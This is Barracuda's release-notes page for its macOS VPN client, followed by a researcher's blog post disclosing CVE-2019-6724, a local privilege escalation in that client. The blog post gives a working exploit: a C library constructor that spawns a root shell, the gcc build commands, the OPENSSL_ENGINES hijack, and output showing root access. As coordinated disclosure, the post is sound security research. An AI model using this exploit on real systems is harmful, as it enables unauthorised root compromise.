[Login](https://campus.barracuda.com/logon/ref/aHR0cHM6Ly9jYW1wdXMuYmFycmFjdWRhLmNvbS9wcm9kdWN0L25ldHdvcmthY2Nlc3NjbGllbnQvZG9jLzc4MTU0MTQ3L3JlbGVhc2Utbm90ZXMtYmFycmFjdWRhLXZwbi1jbGllbnQtZm9yLW1hY29zLw%3D%3D/)

[Login](https://campus.barracuda.com/logon)
[Sign Up](https://campus.barracuda.com/register/)
 [Contact & Support](https://campus.barracuda.com/support)
[![IE](https://campus.barracuda.com/resources/img/flags/IE.png)Ireland – English (GMT+0)](https://campus.barracuda.com/settings)

* Email Protection
* Application & Cloud Security
* Network Security
* Data Protection
* XDR
* Barracuda MSP
* Others

Network Security
Email Protection
Application & Cloud Security
Network Security
Data Protection
XDR
Barracuda MSP
Others

[Email Protection](https://campus.barracuda.com/product/emailprotection/ "Email Protection")

[Total Email Protection](https://campus.barracuda.com/product/totalemailprotection/ "Barracuda Total Email Protection")

[Email Gateway Defense (Email Security)](https://campus.barracuda.com/product/emailgatewaydefense/ "Email Gateway Defense")

[Impersonation Protection (Sentinel)](https://campus.barracuda.com/product/sentinel/ "Impersonation Protection")

[Cloud Archiving Service](https://campus.barracuda.com/product/cloudarchiving/ "Barracuda Cloud Archiving Service")

[Security Awareness Training (PhishLine)](https://campus.barracuda.com/product/phishline/ "Security Awareness Training")

[Email Security Gateway](https://campus.barracuda.com/product/emailsecuritygateway/ "Barracuda Email Security Gateway")

[Domain Fraud Protection](https://campus.barracuda.com/product/domainfraudprotection/ "Barracuda Domain Fraud Protection")

[Incident Response](https://campus.barracuda.com/product/forensics/ "Incident Response")

[Message Archiver](https://campus.barracuda.com/product/messagearchiver/ "Barracuda Message Archiver")

[WAF-as-a-Service](https://campus.barracuda.com/product/WAAS/ "Barracuda WAF-as-a-Service")

[Web Application Firewall](https://campus.barracuda.com/product/webapplicationfirewall/ "Barracuda Web Application Firewall")

[Cloud Security Guardian](https://campus.barracuda.com/product/cloudsecurityguardian/ "Barracuda Cloud Security Guardian")

[Load Balancer ADC](https://campus.barracuda.com/product/loadbalanceradc/ "Barracuda Load Balancer ADC")

[Vulnerability Manager](https://campus.barracuda.com/product/vulnerabilitymanager/ "Barracuda Vulnerability Manager")

[Vulnerability Remediation Service](https://campus.barracuda.com/product/vulnerabilityremediationservice/ "Barracuda Vulnerability Remediation Service")

[WAF Control Center](https://campus.barracuda.com/product/wcc/ "Barracuda WAF Control Center")

[Active DDoS Prevention](https://campus.barracuda.com/product/ddosprevention/ "Barracuda Active DDoS Prevention")

[CloudGen Firewall](https://campus.barracuda.com/product/cloudgenfirewall/ "Barracuda CloudGen Firewall")

[SecureEdge](https://campus.barracuda.com/product/secureedge/ "Barracuda SecureEdge")

[CloudGen Access](https://campus.barracuda.com/product/cloudgenaccess/ "Barracuda CloudGen Access")

[Network Access Client](https://campus.barracuda.com/product/networkaccessclient/ "Barracuda Network Access Client")

[Firewall Insights](https://campus.barracuda.com/product/firewallinsights/ "Barracuda Firewall Insights")

[Web Security Gateway](https://campus.barracuda.com/product/websecuritygateway/ "Barracuda Web Security Gateway")

[Content Shield](https://campus.barracuda.com/product/ContentShield/ "Barracuda Content Shield")

[Web Security Agent](https://campus.barracuda.com/product/websecurityagent/ "Barracuda Web Security Agent")

[Firewall Policy Manager](https://campus.barracuda.com/product/firewallpolicymanager/ "Barracuda Firewall Policy Manager")

[Data Inspector](https://campus.barracuda.com/product/datainspector/ "Barracuda Data Inspector")

[Cloud-to-Cloud Backup](https://campus.barracuda.com/product/cloudtocloudbackup/ "Barracuda Cloud-to-Cloud Backup")

[Backup](https://campus.barracuda.com/product/backup/ "Barracuda Backup")

[XDR](https://campus.barracuda.com/product/xdr/ "Barracuda XDR")

[RMM (Managed Workplace)](https://campus.barracuda.com/product/managedworkplace/ "Barracuda RMM")

[Managed Security Awareness Training (Managed Phishline)](https://campus.barracuda.com/product/phishlinemsp/ "Managed Security Awareness Training")

[Intronis Backup (ECHOplatform)](https://campus.barracuda.com/product/echoplatform/ "Barracuda Intronis Backup")

[MSP App](https://campus.barracuda.com/product/MSPPM/ "MSP App")

[MSP Knowledge Base](https://campus.barracuda.com/product/ISBKB/ "MSP Knowledge Base")

[Site Security Scanner](https://campus.barracuda.com/product/sitesecurityscanner/ "Barracuda Site Security Scanner")

[MSP – Partner Enablement](https://campus.barracuda.com/product/partnerenablementmsp/ "MSP – Partner Enablement")

[Link Balancer](https://campus.barracuda.com/product/linkbalancer/ "Barracuda Link Balancer")

[Essentials](https://campus.barracuda.com/product/essentials/ "Barracuda Essentials")

[Load Balancer](https://campus.barracuda.com/product/loadbalancer/ "Barracuda Load Balancer")

[ArchiveOne](https://campus.barracuda.com/product/archiveone/ "Barracuda ArchiveOne")

[PST Enterprise](https://campus.barracuda.com/product/pstenterprise/ "Barracuda PST Enterprise")

[Server Backup (Yosemite)](https://campus.barracuda.com/product/yosemite/ "Yosemite Server Backup")

[Cloud Control](https://campus.barracuda.com/product/cloudcontrol/ "Barracuda Cloud Control")

[Control Server](https://campus.barracuda.com/product/controlserver/ "Barracuda Control Server")

[Campus Help Center / Reference](https://campus.barracuda.com/product/campus/ "Campus Help Center / Reference")

[Onboarding Portal](https://campus.barracuda.com/product/onboarding/ "Onboarding Portal")

[Network Security](https://campus.barracuda.com/product/networksecurity/ "Network Security")

[Support Services](https://campus.barracuda.com/product/SUP/ "Support Services")

Barracuda Network Access Client

 [Overview](https://campus.barracuda.com/product/networkaccessclient/)
 [Documentation](https://campus.barracuda.com/product/networkaccessclient/articles/)
 [Training](https://campus.barracuda.com/product/networkaccessclient/courses/)
 [Materials](https://campus.barracuda.com/product/networkaccessclient/downloads/)

[![Barracuda Campus](https://campus.barracuda.com/resources/img/logo.svg)
![Barracuda Campus](https://campus.barracuda.com/resources/img/logo_square.svg)](https://campus.barracuda.com/)

 [Product](#product-collapser-search-fixed-nav)

 [Portal](#portal-collapser-search-fixed-nav)

[Login](https://campus.barracuda.com/logon/ref/aHR0cHM6Ly9jYW1wdXMuYmFycmFjdWRhLmNvbS9wcm9kdWN0L25ldHdvcmthY2Nlc3NjbGllbnQvZG9jLzc4MTU0MTQ3L3JlbGVhc2Utbm90ZXMtYmFycmFjdWRhLXZwbi1jbGllbnQtZm9yLW1hY29zLw%3D%3D/)

* Email Protection
* Application & Cloud Security
* Network Security
* Data Protection
* XDR
* Barracuda MSP
* Others

Network Security
Email Protection
Application & Cloud Security
Network Security
Data Protection
XDR
Barracuda MSP
Others

[Email Protection](https://campus.barracuda.com/product/emailprotection/ "Email Protection")

[Total Email Protection](https://campus.barracuda.com/product/totalemailprotection/ "Barracuda Total Email Protection")

[Email Gateway Defense (Email Security)](https://campus.barracuda.com/product/emailgatewaydefense/ "Email Gateway Defense")

[Impersonation Protection (Sentinel)](https://campus.barracuda.com/product/sentinel/ "Impersonation Protection")

[Cloud Archiving Service](https://campus.barracuda.com/product/cloudarchiving/ "Barracuda Cloud Archiving Service")

[Security Awareness Training (PhishLine)](https://campus.barracuda.com/product/phishline/ "Security Awareness Training")

[Email Security Gateway](https://campus.barracuda.com/product/emailsecuritygateway/ "Barracuda Email Security Gateway")

[Domain Fraud Protection](https://campus.barracuda.com/product/domainfraudprotection/ "Barracuda Domain Fraud Protection")

[Incident Response](https://campus.barracuda.com/product/forensics/ "Incident Response")

[Message Archiver](https://campus.barracuda.com/product/messagearchiver/ "Barracuda Message Archiver")

[WAF-as-a-Service](https://campus.barracuda.com/product/WAAS/ "Barracuda WAF-as-a-Service")

[Web Application Firewall](https://campus.barracuda.com/product/webapplicationfirewall/ "Barracuda Web Application Firewall")

[Cloud Security Guardian](https://campus.barracuda.com/product/cloudsecurityguardian/ "Barracuda Cloud Security Guardian")

[Load Balancer ADC](https://campus.barracuda.com/product/loadbalanceradc/ "Barracuda Load Balancer ADC")

[Vulnerability Manager](https://campus.barracuda.com/product/vulnerabilitymanager/ "Barracuda Vulnerability Manager")

[Vulnerability Remediation Service](https://campus.barracuda.com/product/vulnerabilityremediationservice/ "Barracuda Vulnerability Remediation Service")

[WAF Control Center](https://campus.barracuda.com/product/wcc/ "Barracuda WAF Control Center")

[Active DDoS Prevention](https://campus.barracuda.com/product/ddosprevention/ "Barracuda Active DDoS Prevention")

[CloudGen Firewall](https://campus.barracuda.com/product/cloudgenfirewall/ "Barracuda CloudGen Firewall")

[SecureEdge](https://campus.barracuda.com/product/secureedge/ "Barracuda SecureEdge")

[CloudGen Access](https://campus.barracuda.com/product/cloudgenaccess/ "Barracuda CloudGen Access")

[Network Access Client](https://campus.barracuda.com/product/networkaccessclient/ "Barracuda Network Access Client")

[Firewall Insights](https://campus.barracuda.com/product/firewallinsights/ "Barracuda Firewall Insights")

[Web Security Gateway](https://campus.barracuda.com/product/websecuritygateway/ "Barracuda Web Security Gateway")

[Content Shield](https://campus.barracuda.com/product/ContentShield/ "Barracuda Content Shield")

[Web Security Agent](https://campus.barracuda.com/product/websecurityagent/ "Barracuda Web Security Agent")

[Firewall Policy Manager](https://campus.barracuda.com/product/firewallpolicymanager/ "Barracuda Firewall Policy Manager")

[Data Inspector](https://campus.barracuda.com/product/datainspector/ "Barracuda Data Inspector")

[Cloud-to-Cloud Backup](https://campus.barracuda.com/product/cloudtocloudbackup/ "Barracuda Cloud-to-Cloud Backup")

[Backup](https://campus.barracuda.com/product/backup/ "Barracuda Backup")

[XDR](https://campus.barracuda.com/product/xdr/ "Barracuda XDR")

[RMM (Managed Workplace)](https://campus.barracuda.com/product/managedworkplace/ "Barracuda RMM")

[Managed Security Awareness Training (Managed Phishline)](https://campus.barracuda.com/product/phishlinemsp/ "Managed Security Awareness Training")

[Intronis Backup (ECHOplatform)](https://campus.barracuda.com/product/echoplatform/ "Barracuda Intronis Backup")

[MSP App](https://campus.barracuda.com/product/MSPPM/ "MSP App")

[MSP Knowledge Base](https://campus.barracuda.com/product/ISBKB/ "MSP Knowledge Base")

[Site Security Scanner](https://campus.barracuda.com/product/sitesecurityscanner/ "Barracuda Site Security Scanner")

[MSP – Partner Enablement](https://campus.barracuda.com/product/partnerenablementmsp/ "MSP – Partner Enablement")

[Link Balancer](https://campus.barracuda.com/product/linkbalancer/ "Barracuda Link Balancer")

[Essentials](https://campus.barracuda.com/product/essentials/ "Barracuda Essentials")

[Load Balancer](https://campus.barracuda.com/product/loadbalancer/ "Barracuda Load Balancer")

[ArchiveOne](https://campus.barracuda.com/product/archiveone/ "Barracuda ArchiveOne")

[PST Enterprise](https://campus.barracuda.com/product/pstenterprise/ "Barracuda PST Enterprise")

[Server Backup (Yosemite)](https://campus.barracuda.com/product/yosemite/ "Yosemite Server Backup")

[Cloud Control](https://campus.barracuda.com/product/cloudcontrol/ "Barracuda Cloud Control")

[Control Server](https://campus.barracuda.com/product/controlserver/ "Barracuda Control Server")

[Campus Help Center / Reference](https://campus.barracuda.com/product/campus/ "Campus Help Center / Reference")

[Onboarding Portal](https://campus.barracuda.com/product/onboarding/ "Onboarding Portal")

[Network Security](https://campus.barracuda.com/product/networksecurity/ "Network Security")

[Support Services](https://campus.barracuda.com/product/SUP/ "Support Services")

[Login](https://campus.barracuda.com/logon)
[Sign Up](https://campus.barracuda.com/register/)
 [Contact & Support](https://campus.barracuda.com/support)
[![IE](https://campus.barracuda.com/resources/img/flags/IE.png)Ireland – English (GMT+0)](https://campus.barracuda.com/settings)

#### Share This Page

Share this page with your network.

 [Facebook](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fcampus.barracuda.com%2Fproduct%2Fnetworkaccessclient%2Fdoc%2F78154147%2Frelease-notes-barracuda-vpn-client-for-macos%2F "Facebook")

 [LinkedIn](https://www.linkedin.com/shareArticle?url=https%3A%2F%2Fcampus.barracuda.com%2Fproduct%2Fnetworkaccessclient%2Fdoc%2F78154147%2Frelease-notes-barracuda-vpn-client-for-macos%2F&summary=Barracuda+Network+Access+Client%3A+Release+Notes+-+Barracuda+VPN+Client+for+macOS "LinkedIn")

 Email

Cancel

#### Copy Text

Press `ctrl + c` (or `cmd + c` on a Mac) to copy the below text.

Cancel

#### Unpublish revision

0 articles selected
0 articles locked!

Are you sure you want to unpublish?

Options

Republish immediately

Submit
Cancel

#### Permalink

This is a permanent link to this article. Copy the link below for further reference.

Permalink

Close

#### Confirm

No
Yes

Index

[Release Notes](/product/networkaccessclient/doc/168104058/release-notes/)  [Overview](/product/networkaccessclient/doc/168099842/overview/)

# Release Notes - Barracuda VPN Client for macOS

* Last updated on 2024-12-03 10:27:13

This section contains the release notes for the Barracuda Network Access Client for macOS.

#### Version 5.3.6

* An issue related to importing VPN profiles using an OTP has been fixed. [BNNGF-94169]
* A VPN connection establishment issue has been fixed. [BNNGF-92690]

Starting with macOS 15 (Sequoia), application configuration data needs to be stored in a different folder.
Please note that users may receive a confirmation prompt during first startup when upgrading from a previous version.

#### Version 5.3.5

* Switching profiles no longer requires a server certificate to be accepted. [BNNGF-94405]
* An issue related to importing VPN files containing spaces has been fixed. [BNNGF-90834]

#### Version 5.3.3

* SAML authentication now works correctly with certain identity providers. [BNNGF-88118]
* A connection issue related to Barracuda License authentication has been fixed. [BNNGF-87889]
* A VPN tunnel can now be started from macOS System Settings. [BNNGF-84112]

#### Version 5.3.2

* An issue related to incorrect transport mode when importing a VPN configuration has been fixed. [BNNGF-85232]
* VPN state is no longer incorrect when entering standby mode. [BNNGF-85317]
* When multiple versions exist, the correct tunnel extension is now set. [BNNGF-85665]
* When connecting using OTP, the focus is now set on the password field. [BNNGF-86231]
* A connection issue related to SAML authentication has been fixed. [BNNGF-88118]

#### Version 5.3.1

* SAML authentication for Client-to-Site VPN has been improved. [BNNGF-79082, BNNGF-83076]
* Connection error related to invalid tunnel network settings on macOS 12 (Monterey) has been fixed. [BNNGF-83544]
* Status window now opens when double-clicking the app. [BNNGF-83318]
* Logging capacity has been increased. [BNNGF-82174]
* General bug fixes and improvements.

#### Version 5.3.0

* Barracuda VPN Client version 5.3.0 supports macOS 12 (Monterey).
* OS version reporting for VPN clients has been improved. [BNNGF-81123]
* Support for “Optimized” tunnel mode has been added. [BNNGF-80930]
* Support for additional encryption algorithms and key agreement protocols has been added. [BNNGF-81037]
* VPN Client no longer adds a 0.0.0.0 DNS IP. [BNNGF-78481]
* An issue related to usage of encrypted license files has been fixed. [BNNGF-76645]
* VPN profiles can now be added via double-click. [BNNGF-76266]
* Updates for improved usability and stability have been applied.

#### Version 5.2.1

* UI issue on macOS 10.15 (Catalina) has been fixed. [BNNGF-76242]

#### Version 5.2.0

* New UI design has been implemented. [BNNGF-62425]
* SAML authentication for Single-Sign-On is now supported. [BNNGF-68465]
* General bug fixes and improvements.

To use SAML authentication for Client-to-Site VPN, an Advanced Remote Access subscription is required.

#### Version 5.1.9

* Barracuda personal licenses are now sanitized when being read in by the client. [BNNGF-73813]
* Server passwords for personal license authentication are now correctly saved in Apple keychain.
* Client no longer freezes when entering One-Time Password. [BNNGF-73280]
* Configuration of Hash and Tunnel mode now works correctly. [BNNGF-73093]
* Several types of certificates (x.509 authentication) can now be read by the client. [BNNGF-73593]
* Top bar menu now correctly disables all profile names when client is connected.

#### Version 5.1.8

* Localization has been added (German, French, Italian, Spanish, and Japanese).
* Updates for better usability and stability have been applied.
* Multi-factor authentication now works correctly. [BNNGF-72560]

#### Version 5.1.7

* Barracuda VPN Client version 5.1.7 supports macOS 11.00 (Big Sur) and M1 (ARM architecture).

Barracuda VPN Client version 5.1.7 for macOS is available for download in the [Apple App Store](https://apps.apple.com/us/app/barracuda-vpn-client/id1555242566?mt=12). The current version from the App Store will also be available on the [Barracuda Download Portal](http://dlportal.barracudanetworks.com/) under **NAC / VPN Client**.

#### Version 5.1.5

* Multi-Factor Authentication using Time-based One-Time Password (TOTP) has been added. [BNNGF-57691]

#### Version 5.1.4

* Updates for better usability and stability.
* Support for macOS Mojave has been improved.

#### Version 5.0.2.7

* Fix of a moderate security vulnerability (CVE-2019-6724) where under certain circumstances a local privilege escalation attack was possible. [BNNGF-57654]

#### Version 5.0.2.5

* The Barracuda Network Access Client for macOS now offers more granular logging.
* The Barracuda Network Access Client for macOS now supports Fast Reconnect. [BNNGF-55415]
* The VPN client no longer crashes on macOS Mojave. [BNNGF-55574]
* The dark scheme of the VPN client now behaves correctly on macOS.
* Support for macOS running on Intel x86 sixth generation CPUs was dropped.

#### Version 5.0

* Barracuda Network Access Client version 5.0 is the direct successor to Barracuda Network Access Client version 4.3 and contains all improvements and features delivered with version 4.3.
* Updating to Barracuda Network Access Client 5.0 is possible for any prior version.

##### System Requirements

* **Operating Systems** – 10.9 (Mavericks), 10.10 (Yosemite), 10.11 (El Capitan), 10.12 (Sierra), 10.13 (High Sierra), 10.14 (Mojave), or above
* **Disk Space** – 10 MB
* **RAM**– 512 MB

##### What´s New with Barracuda VPN Client for macOS Version 5.0

* Consolidate multiple hosts configuration has been implemented. [BNNGF-52516]

##### Improvements Included with Barracuda VPN Client for macOS Version 5.0

* Keychain support has been implemented for exportable certificates/keys.  [BNNGF-48564 ]

##### Parser Errors

##### In This Article

* [Version 5.3.6](#_3889bb7e)
* [Version 5.3.5](#_e1aff873)
* [Version 5.3.3](#_53e27e69)
* [Version 5.3.2](#_e4ffbf6d)
* [Version 5.3.1](#_3dd9fc60)
* [Version 5.3.0](#_8ac43d64)
* [Version 5.2.1](#_ba752461)
* [Version 5.2.0](#_0d68e565)
* [Version 5.1.9](#_8b6d4545)
* [Version 5.1.8](#_3c708441)
* [Version 5.1.7](#_81cdcb79)
* [Version 5.1.5](#_eff64970)
* [Version 5.1.4](#_58eb8874)
* [Version 5.0.2.7](#_dc0d12a7)
* [Version 5.0.2.5](#_b23690ae)
* [Version 5.0](#_0446e78d)

**Sorry, failed to get the translation, please try again!**

Show translation (Beta)

![](/resources/img/logos/translated_by_google_logo.svg)

##### Additional Resources

* [Glossary](https://campus.barracuda.com/product/networkaccessclient/glossary/)

##### More

Font Size
Small
Medium (default)
Large
Extra Large

Print
Share Page
 [Permalink](https://campus.barracuda.com/doc/168104060/ "Show permanent link for this article")

#####

[Login](https://campus.barracuda.com/logon/ref/aHR0cHM6Ly9jYW1wdXMuYmFycmFjdWRhLmNvbS9wcm9kdWN0L25ldHdvcmthY2Nlc3NjbGllbnQvZG9jLzc4MTU0MTQ3L3JlbGVhc2Utbm90ZXMtYmFycmFjdWRhLXZwbi1jbGllbnQtZm9yLW1hY29zLyNhZGRpdGlvbmFsLWZlZWRiYWNr/)

##### Do you have further questions, remarks or suggestions?

![Barracuda Logo](/resources/img/logo_barracuda_primary_reversed.svg)

[Contact Us](https://campus.barracuda.com/contact/) | [Privacy Policy](https://www.barracuda.com/company/legal/trust-center/data-privacy/privacy-policy) | [Terms & Conditions](https://www.barracuda.com/company/legal/prd_trm) | [Careers](https://www.barracuda.com/company/careers)  | [Campus Help Center](https://campus.barracuda.com/to/help) | [Courses](https://campus.barracuda.com/courses/) | [Training Centers](https://campus.barracuda.com/trainingcenters/)

© 2003 - 2025 [Barracuda Networks](https://www.barracuda.com/), Inc. All rights reserved.

Cookie Preferences

###### Site Map

* [Courses](https://campus.barracuda.com/courses/)
* [Materials](https://campus.barracuda.com/downloadcenter/)
* [Videos](https://campus.barracuda.com/videos/)
* [Glossary](https://campus.barracuda.com/glossary/)
* [Training Centers](https://campus.barracuda.com/trainingcenters/)
* [Campus Help Center](https://campus.barracuda.com/to/help)

###### Resources

* [Barracuda Networks](https://www.barracuda.com/)
* [Customer Login](https://login.barracuda.com/)
* [Partner Portal](https://partners.barracuda.com/login?ref=new_portal)
* [Community Forum](https://www.barracuda.com/join-community)
* [System Status](http://status.barracuda.com/)
* [Corporate Blog](https://blog.barracuda.com/)

###### Contact Us

* [**Contact Form**](https://campus.barracuda.com/contact/)
* **campus@barracuda.com**
* **+1 408 342 5400 / 888 268 4772**
* General: info@barracuda.com
* Sales: sales@barracuda.com
* Support: support@barracuda.com
* [Read More](https://www.barracuda.com/company/contact/)

[Contact Us](https://campus.barracuda.com/contact/) | [Privacy Policy](https://www.barracuda.com/company/legal/trust-center/data-privacy/privacy-policy) | [Terms & Conditions](https://www.barracuda.com/company/legal/prd_trm) | [Careers](https://www.barracuda.com/company/careers) | [Campus Help Center](https://campus.barracuda.com/to/help) | [Courses](https://campus.barracuda.com/courses/) | [Training Centers](https://campus.barracuda.com/trainingcenters/)
Cookie Preferences

© 2003 - 2025 [Barracuda Networks](https://www.barracuda.com/), Inc. All rights reserved.



=== Content from blog.mirch.io_d193e501_20250121_032056.html ===

[Skip to content](#content)

* [Home](/)
* [Vulnerability Research](https://blog.mirch.io/cve/)
* [Github](https://github.com/mirchr/security-research)
* [Twitter](https://twitter.com/0xm1rch)
* [About](https://blog.mirch.io/about/)

Search for:

[Rich Mirch](https://blog.mirch.io "Rich Mirch")
# [Rich Mirch](https://blog.mirch.io/ "Rich Mirch")

## Penetration Tester, Red Teamer, Security Researcher

Menu

[CVE-2019-6724 : Barracuda VPN Client Privilege Escalation on Linux and macOS — February 14, 2019](https://blog.mirch.io/2019/02/14/cve-2019-6724-barracuda-vpn-client-privilege-escalation-on-linux-and-macos/ "CVE-2019-6724 : Barracuda VPN Client Privilege Escalation on Linux and macOS")

[![](https://blog.mirch.io/wp-content/uploads/2019/02/centos-barracuda-vpn-client-privesc.png?w=712)](https://blog.mirch.io/2019/02/14/cve-2019-6724-barracuda-vpn-client-privilege-escalation-on-linux-and-macos/ "CVE-2019-6724 : Barracuda VPN Client Privilege Escalation on Linux and macOS")

## [CVE-2019-6724 : Barracuda VPN Client Privilege Escalation on Linux and macOS](https://blog.mirch.io/2019/02/14/cve-2019-6724-barracuda-vpn-client-privilege-escalation-on-linux-and-macos/)

[February 14, 2019May 3, 2019](https://blog.mirch.io/2019/02/14/cve-2019-6724-barracuda-vpn-client-privilege-escalation-on-linux-and-macos/ "9:31 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

The barracudavpn component of the Barracuda VPN Client prior to version 5.0.2.7 for Linux, macOS, and OpenBSD runs as a privileged process and can allow an unprivileged local attacker to load a malicious library, resulting in arbitrary code executing as root.

This post will walk through the process on how I found and exploited the vulnerability on Linux. The full PoC will  also work on macOS. When researching for potential vulnerabilities with privileged binaries a test system should be used to avoid causing damage or negative impacts.

The first step is to identify a privileged binary. I normally use the [find(1)](http://man7.org/linux/man-pages/man1/find.1.html) command. This example displays setuid binaries under the /usr/local directory. I generally use the -xdev option to avoid traversing other files systems such as NFS. It’s better to be intentional when using find instead of blindly using / for the target path. The -ls option is a nice built-in feature to automatically display the long list of file attributes. Finally, stderr is redirected to /dev/null to discard errors caused by insufficient permissions.

```
[user1@localhost ~]$ find /usr/local -xdev -perm -4000 -ls 2>/dev/null
68555095 4548 -rwsr-xr-x   1 root     root      4653080 Oct 29 02:25 /usr/local/bin/barracudavpn

```

An alternative to using find is to inspect the files installed by a specific package. Often times files are installed to multiple locations so listing out the files contained by a package is helpful. This example uses the rpm command to list files installed in verbose format for the barracudavpn package.

```
[user1@localhost ~]$ rpm -q -l -v barracudavpn
drwxr-xr-x 2 root root 0 Oct 29 02:25 /etc/barracudavpn
-rwsr-xr-x 1 root root 4653080 Oct 29 02:25 /usr/local/bin/barracudavpn

```

There are several things I look for when attacking privileged binaries. If source code is not available my goto utilities for this investigation is tracing system calls using [strace(1)](http://man7.org/linux/man-pages/man1/strace.1.html) and tracing library calls using [ltrace(1)](http://man7.org/linux/man-pages/man1/ltrace.1.html). On macOS I use [Dtrace](https://en.wikipedia.org/wiki/DTrace). Here is a list of a few common vectors. This post will focus on the #2 – loading of libraries.

1. Execute external commands
2. Loading of libraries
3. File paths
4. Environment variables
5. Pipe or store output
6. Configuration files
7. Debug / undocumented features

When executing strace or ltrace as an unprivileged user, privileges will be dropped. Sometimes this is ok but generally the command will exit with an error. When attempting to execute strace as a low privileged user it results in the following error. The error message is not always as obvious as the barracudavpn binary.

```
# Options
#   -o output file with a PID suffix
#   -ff follow forks
#   -s increase maximum string size to print

[user1@localhost ~]$ strace -o /tmp/vpn.trace \
                            -ff \
                            -s 1000 \
                            /usr/local/bin/barracudavpn
```
![barracudavpn-noroot-error](https://blog.mirch.io/wp-content/uploads/2019/02/barracudavpn-noroot-error.png?w=712)

Error because privileges were dropped

To get around this error, run either utility as root using the -u option. After adding this option the application opens without error.

```
[root@localhost ~]# rm -f /tmp/vpn.trace* # cleanup residual traces
[root@localhost ~]# strace -u user1 \
                           -o /tmp/vpn.trace \
                           -ff \
                           -s 1000 \
                           /usr/local/bin/barracudavpn

```
![barracudavpn-noerror](https://blog.mirch.io/wp-content/uploads/2019/02/barracudavpn-noerror.png?w=712)

Application after running strace as root with -u user1

I wanted to see if any libraries were loaded by default at runtime so I exited the application to review the trace file. A simple grep looking for the string “.so” works. barracudavpn attempted to load a non-existent library named libcavium.so from /opt/phio/libs64/engines.

```
[root@localhost ~]# grep \\.so /tmp/vpn.trace.20255
open("/opt/phion/libs/engines/libcavium.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)

```

A low privileged user cannot normally write to /opt so we’ll have to see if we can influence the leading path. This could potentially be achieved by manipulating environment variables, configuration options, or command parameters.

To check for environment variables I ran ltrace to show getenv calls but received the following error.  It turns out the binary is [statically](https://en.wikipedia.org/wiki/Static_build) linked so ltrace will not work.

```
[user1@localhost ~]$ ltrace /usr/local/bin/barracudavpn 2>&1| grep getenv
Couldn't find .dynsym or .dynstr in "/proc/3079/exe"

[user1@localhost ~]$ file /usr/local/bin/barracudavpn
/usr/local/bin/barracudavpn: setuid ELF 64-bit LSB executable,
  x86-64, version 1 (GNU/Linux),
  statically linked,
  for GNU/Linux 2.6.32,
  BuildID[sha1]=34b314b85afe2908266dc8f4229415df09f0e61f, stripped
```

This is an easy check with ltrace but since that failed I decided to run the strings utility and look for an upper case strings. The binary is 4.5 MB so paging through strings output was not practical. A good place to start was looking around the area of the strings I had found in the previous step. The OPENSSL\_ENGINES string jumped out at me  as a potential environment variable. A quick google search shows that this is part of the OpenSSL [engine](https://www.openssl.org/docs/man1.1.1/man1/engine.html) library and most likely the code is from [eng\_list.c](https://github.com/openssl/openssl/blob/3c120f91656f90a9a3b629bb6ea9d5a1f0d4d678/crypto/engine/eng_list.c#L317-L330) and was compiled with ENGINESDIR=/opt/phion/libs/engines.

```
[root@localhost ~]# strings /usr/local/bin/barracudavpn|grep -C5 /opt/phion/libs/engines
OpenSSL DH Method
dh_lib.c
Diffie-Hellman part of OpenSSL 1.0.1u 22 Sep 2016
eng_list.c
OPENSSL_ENGINES
/opt/phion/libs/engines
DIR_LOAD
DIR_ADD
eng_init.c
eng_ctrl.c
eng_pkey.c

```

A simple test is to set the environment variable to a unique value. I used /foobar for this test and re-ran barracudavpn. The open() call confirms the environment variable can be changed to a path we control to load the library. If privileges are not dropped prior to the loading of this library we can achieve arbitrary code execution as root. I could look for set\*uid calls but as a simple test I will just set the variable and see what happens. The link step on macOS is slightly different. View the full PoC linked below for an example.

```
[root@localhost ~]# export OPENSSL_ENGINES=/foobar
[root@localhost ~]# timeout 10s strace -u user1 -ff /usr/local/bin/barracudavpn 2>&1|grep '\.so'
open("/foobar/libcavium.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)

```

At this point I am confident that a library of my choice could be loaded. I created a simple woot() function to execute a shell.

```
#include
#include
#include

void woot(){
  setreuid(0,0);
  execl("/bin/sh","/bin/sh",NULL);
}
```

Build the shared library and write it in the foobar directory. Notice the -init,woot flag. This specifies what function to use as the constructor and the default name is \_init. Details on how this works can be found in section 5.2 of the Program-Library-HOWTO [miscellaneous](http://tldp.org/HOWTO/Program-Library-HOWTO/miscellaneous.html) page.

```
[user1@localhost ~]$ mkdir foobar
[user1@localhost ~]$ gcc -fPIC -Wall -o woot.o -c woot.c
[user1@localhost ~]$ gcc -Wall -shared -Wl,-soname,libcavium.so -Wl,-init,woot -o foobar/libcavium.so woot.o
[user1@localhost ~]$ export OPENSSL_ENGINES=foobar

```

Execute /usr/local/bin/barracudavpn to spawn a root shell.

```
[user1@localhost ~]$ id
uid=1000(user1) gid=1000(user1) groups=1000(user1) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

[user1@localhost ~]$ /usr/local/bin/barracudavpn
sh-4.2# id
uid=0(root) gid=1000(user1) groups=1000(user1) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
sh-4.2#

```

The full PoC for Linux and macOS can be found on my Github page [CVE-2019-6724.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2019-6724.sh).

## Summary

When a privileged binary loads an external library, care must be taken to ensure the library cannot be loaded from an untrusted location. As a low privileged user, look for writeable paths where libraries are loaded from. Dynamic libraries can be loaded from static paths, paths based on environment variables, configuration options, or command parameters. Also keep in mind that this behavior might not be documented. Strace and ltrace are standard tools that I use identify libraries loaded dynamically by the target program.

I appreciate the partnership with Dave Farrow – Senior Director, Information Security – Barracuda Networks.

## References

* PoC: [CVE-2019-6724.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2019-6724.sh)
* <http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-6724>
* [macOS Barracuda VPN Client Release Notes](http://campus.barracuda.com/product/networkaccessclient/doc/78154147/release-notes-barracuda-vpn-client-for-macos/)
* [Linux Barracuda VPN Client Release Notes](http://campus.barracuda.com/product/networkaccessclient/doc/78154149/release-notes-barracuda-vpn-client-for-linux/)

## Timeline

2019-01-02 Report sent to vendor via [BugCrowd](https://bugcrowd.com/barracuda)

2019-01-03 Vendor acknowledges report

2019-01-07 Vendor meeting regarding coordinated disclosure

2019-01-17 Vendor releases fixes

